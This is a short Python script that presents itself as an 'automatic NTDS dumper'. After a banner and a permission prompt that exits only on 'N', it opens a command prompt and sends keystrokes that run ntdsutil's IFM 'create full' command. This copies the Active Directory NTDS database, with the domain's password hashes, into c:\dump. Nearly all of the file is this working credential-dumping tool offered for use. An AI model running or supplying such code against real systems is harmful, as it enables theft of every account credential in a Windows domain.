import time
import os
import subprocess
import win32api
import win32com.client

print("****************************************************")
print("**           AUTOMATIC NTDS DUMPER V0.3           **")
print("**             MUST BE RUN AS ADMIN!              **")
print("**            TWITTER: @evopilottuner             **")
print("****************************************************")
print("                          /\          /\            ")
print("                         ( \\        // )           ")
print("                          \ \\      // /            ")
print("                           \_\\||||//_/             ")
print("                            \/ _  _ \               ")
print("                           \/|(O)(O)|               ")
print("                          \/ |      |               ")
print("      ___________________\/  \      /               ")
print("     //                //     |____|                ")
print("    //                ||     /      \               ")
print("   //|                \|     \ 0  0 /               ")
print("  // \       )         V    / \____/                ") 
print(" //   \     /        (     /                        ")
print("     \   /_________|  |_/                           ")
print("       /  /\   /     |  ||                          ")
print("      /  / /  /      \  ||                          ")
print("      | |  | |        | ||                          ")
print("      | |  | |        | ||                          ")
print("      |_|  |_|        |_||                          ")       
print("       \_\  \_\        \_\\                         ")  
print("****************************************************")
print(" ")
disclaim = input("Do you have permission to use this tool? Y/N?")
print(disclaim)
if disclaim == 'n':
	print("** YOU MUST HAVE PERMISSION TO USE THIS PROGRAM **")
	print("GOODBYE!")
	time.sleep(2)
	exit()
elif disclaim == 'N':
	print("** YOU MUST HAVE PERMISSION TO USE THIS PROGRAM **")
	print("GOODBYE!")
	time.sleep(2)
	exit()

program = 'C:\\Windows\\System32\\cmd.exe /admin'
subprocess.Popen(program)
shell = win32com.client.Dispatch("WScript.Shell")
shell.SendKeys("mkdir c:\dump{ENTER}")
win32api.Sleep(500)
shell.SendKeys("ntdsutil{ENTER}")
win32api.Sleep(500)
shell.SendKeys("activate instance ntds{ENTER}")
win32api.Sleep(500)
shell.SendKeys("ifm{ENTER}")
win32api.Sleep(500)
shell.SendKeys("create full c:\dump{ENTER}")
win32api.Sleep(500)


time.sleep(4)

